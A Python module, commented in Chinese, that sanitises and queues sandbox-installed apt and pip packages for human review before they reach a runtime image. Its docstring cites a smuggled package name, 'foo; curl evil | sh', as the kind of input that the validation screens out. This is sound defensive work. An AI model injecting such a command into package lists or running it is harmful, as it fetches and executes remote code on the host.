"""待審依賴清單 —— 沙箱裝了什麼，等人決定要不要進 runtime。

沙箱是短暫容器，裝出來的檔案跟著容器一起消失，所以「把沙箱裡驗過的東西搬到
runtime」實際上搬得動的只有**清單**。這個模組負責清單那一段：

    沙箱裝套件 → run_task.py 拍前後快照 → result.json 的 installed
      → 這裡消毒後寫進 hermes-deps 卷的 pending/
      → （宿主機上）make deps-list / make deps-accept
      → runtime/deps/*.txt → git commit → make build

**controller 到此為止。** 它不會、也不該去改 runtime 映像的來源。它已經是整套
架構裡權限最高的一環（能建容器、能把程式碼晉升到線上技能目錄）；再給它「決定
正式映像裝什麼」的能力，自我進化的迴圈就完全閉合，中間沒有任何人類檢查點。

# 為什麼要消毒

``installed`` 裡的套件名稱是沙箱裡的程式碼產生的，而它最終會被寫進一個之後
餵給 ``apt-get install`` 的檔案。一個叫 ``foo; curl evil | sh`` 的「套件」如果
一路活到 runtime/deps/apt.txt，那條註記人工審查的防線就只剩「希望有人看到」。
所以名稱與版本在寫檔前就用白名單正則篩過，不合格的直接丟掉並記錄下來。
"""

from __future__ import annotations

import json
import logging
import os
import re
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

log = logging.getLogger(__name__)

# 單次任務最多記多少個套件。一個 `apt-get install postgresql-17` 會連帶拉進
# 幾十個相依套件，所以上限不能太小；但也不該讓一次失控的任務寫出一份幾萬行
# 的清單來癱瘓審查。
_MAX_PACKAGES_PER_KIND = 400

# Debian 套件名：小寫字母、數字、加號、減號、點。Python 套件名（PEP 508）
# 另外允許底線與大寫。兩者合起來用同一條規則，寧可寬一格也不要為了嚴謹而
# 把合法套件擋在外面 —— 真正要防的是空白、分號、引號、路徑分隔字元那類東西。
_NAME_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+-]{0,127}$")

# 版本字串。Debian 的 epoch 用冒號（1:2.3-4），波浪號用於 pre-release。
_VERSION_RE = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._+:~-]{0,127}$")

_KINDS = ("apt", "pip")


def _now() -> str:
    return datetime.now(timezone.utc).isoformat()


def sanitise(installed: Any) -> tuple[dict[str, list[dict[str, str]]], list[str]]:
    """把沙箱回報的 installed 篩成可以安全寫進檔案的形狀。

    回傳 ``(乾淨的清單, 被丟掉的原因描述)``。丟掉的項目一定會出現在第二個
    回傳值裡 —— 靜靜地少掉幾個套件，會讓人在 runtime 裡找不到東西時完全無從
    查起。
    """
    clean: dict[str, list[dict[str, str]]] = {kind: [] for kind in _KINDS}
    rejected: list[str] = []

    if not isinstance(installed, dict):
        return clean, ["沙箱沒有回報 installed 欄位（或格式不是物件）"]

    for kind in _KINDS:
        entries = installed.get(kind)
        if entries is None:
            continue
        if not isinstance(entries, list):
            rejected.append(f"{kind}: 不是陣列，整組丟棄")
            continue

        if len(entries) > _MAX_PACKAGES_PER_KIND:
            rejected.append(
                f"{kind}: 回報了 {len(entries)} 個套件，超過上限 "
                f"{_MAX_PACKAGES_PER_KIND}，只取前面這些"
            )
            entries = entries[:_MAX_PACKAGES_PER_KIND]

        seen: set[str] = set()
        for entry in entries:
            if not isinstance(entry, dict):
                rejected.append(f"{kind}: 項目不是物件 —— {entry!r:.80}")
                continue
            name = str(entry.get("name", ""))
            version = str(entry.get("version", ""))
            if not _NAME_RE.match(name):
                rejected.append(f"{kind}: 套件名不合格 —— {name!r:.80}")
                continue
            if not _VERSION_RE.match(version):
                rejected.append(f"{kind}: {name} 的版本字串不合格 —— {version!r:.80}")
                continue
            if name in seen:
                continue
            seen.add(name)

            record: dict[str, str] = {"name": name, "version": version}
            previous = entry.get("previous")
            if isinstance(previous, str) and _VERSION_RE.match(previous):
                record["previous"] = previous
            clean[kind].append(record)

        clean[kind].sort(key=lambda e: e["name"])

    unavailable = installed.get("unavailable")
    if isinstance(unavailable, list) and unavailable:
        rejected.append(
            "沙箱抓不到這幾類的套件快照：" + ", ".join(str(u) for u in unavailable)
        )

    return clean, rejected


def _pending_dir(deps_dir: Path) -> Path:
    return deps_dir / "pending"


def _safe_task_id(task_id: str) -> str:
    """任務 ID 會變成檔名，所以它得先證明自己只是個 ID。"""
    if not re.match(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,127}$", task_id):
        raise ValueError(f"任務 ID {task_id!r} 不能當作檔名")
    return task_id


def record(
    deps_dir: Path,
    *,
    task_id: str,
    skill: str,
    installed: Any,
    privileged: bool,
    sandbox_status: str,
    instance: str,
) -> Path | None:
    """把一次沙箱執行裝到的套件記成待審清單。

    什麼都沒裝就不寫檔 —— 一個裝滿空清單的 pending/ 目錄，會讓「有東西要審」
    這個訊號完全失去意義。回傳寫出的檔案路徑，或 None（代表沒東西要記）。
    """
    clean, rejected = sanitise(installed)
    if not any(clean[kind] for kind in _KINDS):
        if rejected:
            log.info("任務 %s 沒有可記錄的依賴：%s", task_id, "；".join(rejected))
        return None

    payload = {
        "task_id": _safe_task_id(task_id),
        "skill": skill,
        "instance": instance,
        "recorded_at": _now(),
        "privileged": privileged,
        "sandbox_status": sandbox_status,
        "packages": clean,
        "rejected": rejected,
    }

    target_dir = _pending_dir(deps_dir)
    target_dir.mkdir(parents=True, exist_ok=True)
    target = target_dir / f"{task_id}.json"
    tmp = target.with_suffix(".json.tmp")
    tmp.write_text(json.dumps(payload, ensure_ascii=False, indent=2), encoding="utf-8")
    os.replace(tmp, target)

    log.info(
        "任務 %s 記錄了 %d 個 apt 套件與 %d 個 pip 套件待審（%s）",
        task_id, len(clean["apt"]), len(clean["pip"]), target,
    )
    return target


def list_pending(deps_dir: Path) -> list[dict[str, Any]]:
    """列出所有待審清單，新的排前面。"""
    directory = _pending_dir(deps_dir)
    if not directory.is_dir():
        return []
    out: list[dict[str, Any]] = []
    for path in sorted(directory.glob("*.json"), reverse=True):
        try:
            parsed = json.loads(path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError) as exc:
            log.warning("待審清單 %s 讀不了：%s", path, exc)
            continue
        if isinstance(parsed, dict):
            out.append(parsed)
    return out


def get_pending(deps_dir: Path, task_id: str) -> dict[str, Any] | None:
    path = _pending_dir(deps_dir) / f"{_safe_task_id(task_id)}.json"
    try:
        parsed = json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return None
    return parsed if isinstance(parsed, dict) else None


def resolve(deps_dir: Path, task_id: str, *, outcome: str) -> bool:
    """把一份待審清單從 pending/ 移走。

    ``outcome`` 是 accepted 或 rejected。兩者都保留檔案而不是刪除 —— 「誰在
    什麼時候決定 runtime 要裝什麼」屬於稽核軌跡，跟技能版本庫是同一個道理。
    """
    if outcome not in {"accepted", "rejected"}:
        raise ValueError(f"未知的處置：{outcome!r}")

    source = _pending_dir(deps_dir) / f"{_safe_task_id(task_id)}.json"
    if not source.is_file():
        return False

    target_dir = deps_dir / outcome
    target_dir.mkdir(parents=True, exist_ok=True)
    stamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    os.replace(source, target_dir / f"{task_id}.{stamp}.json")
    return True
